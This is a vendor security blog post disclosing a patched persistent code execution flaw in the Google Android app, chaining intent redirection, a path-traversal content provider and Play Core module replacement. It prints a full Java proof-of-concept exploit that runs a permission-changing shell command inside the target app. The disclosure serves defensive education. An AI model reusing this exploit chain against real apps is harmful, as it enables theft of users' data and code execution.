---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-06-17_why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-google-example.md
original_filename: 2021-06-17_why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-google-example.md
title: 'Why dynamic code loading could be dangerous for your apps: a Google example'
category: documents
detected_topics:
- mobile-security
- supply-chain
- command-injection
- path-traversal
- otp
- graphql
tags:
- imported
- documents
- mobile-security
- supply-chain
- command-injection
- path-traversal
- otp
- graphql
language: en
raw_sha256: cd74cc864541ca9227549f8b8ae49c0aab33f867650dd2cf4fed98952dd969af
text_sha256: 7327caf7ac97a7a7c112adf199e4b2e211f0b90df13833a7f81bb4ffd7390101
ingested_at: '2026-06-28T07:32:06Z'
sensitivity: unknown
redactions_applied: false
---

# Why dynamic code loading could be dangerous for your apps: a Google example

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-06-17_why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-google-example.md
- Source Type: markdown
- Detected Topics: mobile-security, supply-chain, command-injection, path-traversal, otp, graphql
- Ingested At: 2026-06-28T07:32:06Z
- Redactions Applied: False
- Raw SHA256: `cd74cc864541ca9227549f8b8ae49c0aab33f867650dd2cf4fed98952dd969af`
- Text SHA256: `7327caf7ac97a7a7c112adf199e4b2e211f0b90df13833a7f81bb4ffd7390101`


## Content

---
title: "Why dynamic code loading could be dangerous for your apps: a Google example"
page_title: "Why dynamic code loading could be dangerous for your apps: a Google example | Oversecured Blog"
url: "https://blog.oversecured.com/Why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-Google-example/"
final_url: "https://oversecured.com/blog/why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-google-example"
authors: ["Oversecured (@OversecuredInc)"]
programs: ["Google"]
bugs: ["Arbitrary file write", "Insecure intent", "Android"]
publication_date: "2021-06-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3568
---

Dast is live! 

Run a new scan to see dynamic findings in your reports

[Learn more →](../dast)

Dast is live! 

[Learn more →](../dast)

Dast is live! 

Run a new scan to see dynamic findings in your reports

[Learn more →](../dast)

[](../)

[BLOG](../blog)

[Case studies](https://oversecured.com/blog?category=case-study)

[Partner](../partner)

[Wall of fame](../cve)

solutions

[Sign in](https://app.oversecured.com/sign-in)

Contact us

[](../)

[](../)

No headings found on page

May 17, 2021

Android Security

###### Why dynamic code loading could be dangerous for your apps: a Google example

###### Why dynamic code loading could be dangerous for your apps: a Google example

![](https://framerusercontent.com/images/kx0BR11E1KQQWNTxjZ3DiVw9Ls.png?width=2048&height=1194)

Almost every Android app dynamically loads code from native `.so`libraries or `.dex` files. There are also some special libraries like Google Play Core to simplify this process.

In this blog, we want to convince developers not to load any code dynamically, because this unsafe practice can escalate a vulnerability that allows stealing/overwriting arbitrary files into critical code execution inside a vulnerable app.

For example: in the [Google app](https://play.google.com/store/apps/details?id=com.google.android.googlequicksearchbox), which will be discussed in detail later, the attack chain looked like this:

Intent redirection > gaining access to a vulnerable content provider and writing an arbitrary Google Play Core library module > resulting in persistent local code execution.

We also [found](https://blog.oversecured.com/Oversecured-detects-dangerous-vulnerabilities-in-the-TikTok-Android-app/) a similar vulnerability in the TikTok app.

Do you want to check your mobile apps for such types of vulnerabilities? Oversecured mobile apps scanner provides an automatic solution that helps to detect vulnerabilities in Android and iOS mobile apps. You can integrate Oversecured into your development process and check every new line of your code to ensure your users are always protected.

Start securing your apps by starting a free 2-week trial from [Quick Start](https://app.oversecured.com/docs/quick-start/), or you can [book a call](https://calendly.com/oversecured/30min) with our team or [contact us](https://app.oversecured.com/contact-us) to explore more.

## Arbitrary code execution in Google

While securing pre-installed apps on Android devices, we discovered persistent arbitrary code execution in the Google app. Google fixed the issue in May 2021. This could have allowed any app installed on the same device to steal arbitrary data from it, for example, accessing a Google account, user’s search history, voice assistant interaction data, mail from Gmail, and to intercept app rights, including access to read and send SMS messages, contacts, call history (as well as making and receiving calls), calendar, microphone, camera, location, Bluetooth and NFC.

The attacker’s app needed to launch only once for this attack to succeed. After that, even if the app was removed, the malicious functionality would continue to be present in the Google app independently. Moreover, the attack did not require any user consent or notice.

## Discovering the bug

We scanned the app and found [intent redirection](https://blog.oversecured.com/Android-Access-to-app-protected-components/):

![](https://framerusercontent.com/images/ivgwpwLhPbwP60pMlg9Z1FY1ug.png?width=2244&height=24774)

Then, we found one of the providers with the flag `android:grantUriPermissions="true"`:
  
  
  <provider android:name="com.google.android.apps.gsa.contentprovider.CommonContentProvider" android:exported="false" android:process=":search" android:authorities="com.google.android.googlequicksearchbox.CommonContentProvider" android:grantUriPermissions="true" />
  
  
  <provider android:name="com.google.android.apps.gsa.contentprovider.CommonContentProvider" android:exported="false" android:process=":search" android:authorities="com.google.android.googlequicksearchbox.CommonContentProvider" android:grantUriPermissions="true" />
  
  
  <provider android:name="com.google.android.apps.gsa.contentprovider.CommonContentProvider" android:exported="false" android:process=":search" android:authorities="com.google.android.googlequicksearchbox.CommonContentProvider" android:grantUriPermissions="true" />

It contained several handlers, one of which was in the class `com.google.android.apps.gsa.staticplugins.assist.screenshot.C29246g`:
  
  
  public final ParcelFileDescriptor mo33581g(Uri uri, String str) { // a handler for `openFile(..)` method
  m33580f(uri);
  File i = m33575i(uri); // `/data/data/com.google.android.googlequicksearchbox/files/ScreenAssistScreenshots/` directory
  if (i == null) {
  //...
  }
  i.mkdirs();
  // `uri.getLastPathSegment()` returns a decoded value, a path-traversal is here
  return ParcelFileDescriptor.open(new File(i, uri.getLastPathSegment()), ParcelFileDescriptor.parseMode(str.toLowerCase(Locale.getDefault())));
  }
  
  
  public final ParcelFileDescriptor mo33581g(Uri uri, String str) { // a handler for `openFile(..)` method
  m33580f(uri);
  File i = m33575i(uri); // `/data/data/com.google.android.googlequicksearchbox/files/ScreenAssistScreenshots/` directory
  if (i == null) {
  //...
  }
  i.mkdirs();
  // `uri.getLastPathSegment()` returns a decoded value, a path-traversal is here
  return ParcelFileDescriptor.open(new File(i, uri.getLastPathSegment()), ParcelFileDescriptor.parseMode(str.toLowerCase(Locale.getDefault())));
  }
  
  
  public final ParcelFileDescriptor mo33581g(Uri uri, String str) { // a handler for `openFile(..)` method
  m33580f(uri);
  File i = m33575i(uri); // `/data/data/com.google.android.googlequicksearchbox/files/ScreenAssistScreenshots/` directory
  if (i == null) {
  //...
  }
  i.mkdirs();
  // `uri.getLastPathSegment()` returns a decoded value, a path-traversal is here
  return ParcelFileDescriptor.open(new File(i, uri.getLastPathSegment()), ParcelFileDescriptor.parseMode(str.toLowerCase(Locale.getDefault())));
  }

As a result, it led to [gaining](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/) read/write access to arbitrary files.

The scan report also contained alerts from the [Dynamic code loading ](https://app.oversecured.com/vulnerabilities#Dynamic_code_loading)category:

![](https://framerusercontent.com/images/Q8vJDtLAgAUgCgpwZSTxe7E9Mc.png?width=2250&height=9510)

This indicated that the app uses the Google Play Core library. Now, if an attacker wrote an arbitrary module, the classes from the attacker’s module would automatically be added to the ClassLoader of the app.

A more detailed description about the method of replacing modules is described in the [article](https://blog.oversecured.com/Oversecured-automatically-discovers-persistent-code-execution-in-the-Google-Play-Core-Library/) dedicated to this vulnerability in the Google Play Core library.

### Proof of Concept

This code will execute the command `chmod -R 777 /data/data/com.google.android.googlequicksearchbox` in the context of Google.

File `MainActivity.java`
  
  
  public class MainActivity extends Activity {
  static final String APP = "com.google.android.googlequicksearchbox";
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  handle(getIntent());
  }
  
  protected void onNewIntent(Intent intent) {
  super.onNewIntent(intent);
  
  handle(intent);
  }
  
  private void handle(Intent intent) {
  if ("evil".equals(intent.getAction())) {
  try (InputStream inputStream = new FileInputStream(getApplicationInfo().sourceDir)) {
  try (OutputStream outputStream = getContentResolver().openOutputStream(intent.getData())) {
  IOUtils.copy(inputStream, outputStream);
  }
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  start();
  } else {
  Uri uri = Uri.parse("content://com.google.android.googlequicksearchbox.CommonContentProvider/assist.com.google.android.apps.gsa.staticplugins.assist.screenshot.ScreenshotProvider/1/ScreenAssistScreenshots/..%2Fsplitcompat%2F" + getVersionCode() + "%2Fverified-splits%2Fconfig.test.apk");
  Intent next = new Intent("evil", uri);
  next.setClass(this, getClass());
  next.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
  
  Intent i = new Intent("android.intent.action.ASSIST");
  i.setClassName(APP, "com.google.android.googlequicksearchbox.SearchActivity");
  i.putExtra("KEY_HANDOVER_THROUGH_VELVET", next);
  startActivity(i);
  }
  }
  
  private int getVersionCode() {
  try {
  return getPackageManager().getPackageInfo(APP, 0).versionCode;
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  
  private void start() { // that broadcast receiver automatically tries to deserialize a value
  Intent i = new Intent("com.google.android.gms.udc.action.FACS_CACHE_UPDATED_EXPLICIT");
  i.setClassName(APP, "com.google.android.apps.search.googleapp.permissions.udcdataservice.facs.FacsBroadcastReceiver_Receiver");
  i.putExtra("evil", new EvilParcelable());
  sendBroadcast(i);
  }
  }
  
  
  public class MainActivity extends Activity {
  static final String APP = "com.google.android.googlequicksearchbox";
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  handle(getIntent());
  }
  
  protected void onNewIntent(Intent intent) {
  super.onNewIntent(intent);
  
  handle(intent);
  }
  
  private void handle(Intent intent) {
  if ("evil".equals(intent.getAction())) {
  try (InputStream inputStream = new FileInputStream(getApplicationInfo().sourceDir)) {
  try (OutputStream outputStream = getContentResolver().openOutputStream(intent.getData())) {
  IOUtils.copy(inputStream, outputStream);
  }
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  start();
  } else {
  Uri uri = Uri.parse("content://com.google.android.googlequicksearchbox.CommonContentProvider/assist.com.google.android.apps.gsa.staticplugins.assist.screenshot.ScreenshotProvider/1/ScreenAssistScreenshots/..%2Fsplitcompat%2F" + getVersionCode() + "%2Fverified-splits%2Fconfig.test.apk");
  Intent next = new Intent("evil", uri);
  next.setClass(this, getClass());
  next.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
  
  Intent i = new Intent("android.intent.action.ASSIST");
  i.setClassName(APP, "com.google.android.googlequicksearchbox.SearchActivity");
  i.putExtra("KEY_HANDOVER_THROUGH_VELVET", next);
  startActivity(i);
  }
  }
  
  private int getVersionCode() {
  try {
  return getPackageManager().getPackageInfo(APP, 0).versionCode;
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  
  private void start() { // that broadcast receiver automatically tries to deserialize a value
  Intent i = new Intent("com.google.android.gms.udc.action.FACS_CACHE_UPDATED_EXPLICIT");
  i.setClassName(APP, "com.google.android.apps.search.googleapp.permissions.udcdataservice.facs.FacsBroadcastReceiver_Receiver");
  i.putExtra("evil", new EvilParcelable());
  sendBroadcast(i);
  }
  }
  
  
  public class MainActivity extends Activity {
  static final String APP = "com.google.android.googlequicksearchbox";
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  handle(getIntent());
  }
  
  protected void onNewIntent(Intent intent) {
  super.onNewIntent(intent);
  
  handle(intent);
  }
  
  private void handle(Intent intent) {
  if ("evil".equals(intent.getAction())) {
  try (InputStream inputStream = new FileInputStream(getApplicationInfo().sourceDir)) {
  try (OutputStream outputStream = getContentResolver().openOutputStream(intent.getData())) {
  IOUtils.copy(inputStream, outputStream);
  }
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  start();
  } else {
  Uri uri = Uri.parse("content://com.google.android.googlequicksearchbox.CommonContentProvider/assist.com.google.android.apps.gsa.staticplugins.assist.screenshot.ScreenshotProvider/1/ScreenAssistScreenshots/..%2Fsplitcompat%2F" + getVersionCode() + "%2Fverified-splits%2Fconfig.test.apk");
  Intent next = new Intent("evil", uri);
  next.setClass(this, getClass());
  next.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
  
  Intent i = new Intent("android.intent.action.ASSIST");
  i.setClassName(APP, "com.google.android.googlequicksearchbox.SearchActivity");
  i.putExtra("KEY_HANDOVER_THROUGH_VELVET", next);
  startActivity(i);
  }
  }
  
  private int getVersionCode() {
  try {
  return getPackageManager().getPackageInfo(APP, 0).versionCode;
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  
  private void start() { // that broadcast receiver automatically tries to deserialize a value
  Intent i = new Intent("com.google.android.gms.udc.action.FACS_CACHE_UPDATED_EXPLICIT");
  i.setClassName(APP, "com.google.android.apps.search.googleapp.permissions.udcdataservice.facs.FacsBroadcastReceiver_Receiver");
  i.putExtra("evil", new EvilParcelable());
  sendBroadcast(i);
  }
  }

File `EvilParcelable.java`
  
  
  public class EvilParcelable implements Parcelable {
  public static final Parcelable.Creator<EvilParcelable> CREATOR = new Parcelable.Creator<EvilParcelable>() {
  public EvilParcelable createFromParcel(android.os.Parcel parcel) {
  exploit();
  return null;
  }
  
  public EvilParcelable[] newArray(int i) {
  exploit();
  return null;
  }
  
  private void exploit() {
  try {
  Runtime.getRuntime().exec("chmod -R 777 /data/data/" + MainActivity.APP).waitFor();
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  };
  
  public int describeContents() { return 0; }
  public void writeToParcel(android.os.Parcel parcel, int i) {}
  }
  
  
  public class EvilParcelable implements Parcelable {
  public static final Parcelable.Creator<EvilParcelable> CREATOR = new Parcelable.Creator<EvilParcelable>() {
  public EvilParcelable createFromParcel(android.os.Parcel parcel) {
  exploit();
  return null;
  }
  
  public EvilParcelable[] newArray(int i) {
  exploit();
  return null;
  }
  
  private void exploit() {
  try {
  Runtime.getRuntime().exec("chmod -R 777 /data/data/" + MainActivity.APP).waitFor();
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  };
  
  public int describeContents() { return 0; }
  public void writeToParcel(android.os.Parcel parcel, int i) {}
  }
  
  
  public class EvilParcelable implements Parcelable {
  public static final Parcelable.Creator<EvilParcelable> CREATOR = new Parcelable.Creator<EvilParcelable>() {
  public EvilParcelable createFromParcel(android.os.Parcel parcel) {
  exploit();
  return null;
  }
  
  public EvilParcelable[] newArray(int i) {
  exploit();
  return null;
  }
  
  private void exploit() {
  try {
  Runtime.getRuntime().exec("chmod -R 777 /data/data/" + MainActivity.APP).waitFor();
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  };
  
  public int describeContents() { return 0; }
  public void writeToParcel(android.os.Parcel parcel, int i) {}
  }

### The result

![](https://framerusercontent.com/images/LtGa5XLePSQHQ7ZVlh2PhisWkKY.png?width=1010&height=650)

##### Keep reading

[View all](../blog)

[![](https://framerusercontent.com/images/Rc4vdbWk96raW6IX7NbRcRJoS5U.png?width=2046&height=1194)20 Security Issues Found in Xiaomi DevicesOversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilitiesCase StudyMay 2, 202415min readTOp article](./20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/W9Wn9vbZPPJFNH7MN7Zx6QXches.png?width=2048&height=1194)Android deep link vulnerabilities: how intent filters lead to account takeoverA technical guide to Android deep link security. Learn how intent filter misconfigurations lead to account takeover, and how mobile application security testing with SAST and DAST finds these vulnerability chains.Android SecurityApr 27, 20268min read](./android-deep-link-vulnerabilities)

[![](https://framerusercontent.com/images/3pdKQL7LiXMgBBDS1jzcalJrMnA.png?width=2048&height=1194)Android security checklist: theft of arbitrary filesDevelopers for Android do a lot of work with files and exchange them with other apps, for example, to get photos, images, or user data. Android SecurityMay 20, 202211min readTOp article](./android-security-checklist-theft-of-arbitrary-files)

[![](https://framerusercontent.com/images/Rc4vdbWk96raW6IX7NbRcRJoS5U.png?width=2046&height=1194)20 Security Issues Found in Xiaomi DevicesOversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilitiesCase StudyMay 2, 202415min readTOp article](./20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/Rc4vdbWk96raW6IX7NbRcRJoS5U.png?width=2046&height=1194)20 Security Issues Found in Xiaomi DevicesOversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilitiesCase StudyMay 2, 202415min readTOp article](./20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/W9Wn9vbZPPJFNH7MN7Zx6QXches.png?width=2048&height=1194)Android deep link vulnerabilities: how intent filters lead to account takeoverA technical guide to Android deep link security. Learn how intent filter misconfigurations lead to account takeover, and how mobile application security testing with SAST and DAST finds these vulnerability chains.Android SecurityApr 27, 20268min read](./android-deep-link-vulnerabilities)

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

[](../)

[Blog](../blog)

[Case Studies](https://oversecured.com/blog?category=case-study)

[Partner](../partner)

[Wall of fame](../cve)

[Dynamic Analysis (DAST)](../dast)

[Static Analysis (SAST)](../sast)

[Interactive Analysis (IAST)](../iast)

2026 © Oversecured

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](../privacy)

[Terms of use](../terms)

[go up ↑](./why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-google-example#header)

[](../)

[go up ↑](./why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-google-example#header)

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](../privacy)

[Terms of use](../terms)

2026 © Oversecured

[Blog](../blog)

[Partner](../partner)

[Wall of fame](../cve)

[Dynamic Analysis (DAST)](../dast)

[Static Analysis (SAST)](../sast)

[Interactive Analysis (IAST)](../iast)

[Case Studies](https://oversecured.com/blog?category=case-study)

[](../)

[Blog](../blog)

[Case Studies](https://oversecured.com/blog?category=case-study)

[Partner](../partner)

[Wall of fame](../cve)

[Dynamic Analysis (DAST)](../dast)

[Static Analysis (SAST)](../sast)

[Interactive Analysis (IAST)](../iast)

2026 © Oversecured

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](../privacy)

[Terms of use](../terms)

[go up ↑](./why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-google-example#header)
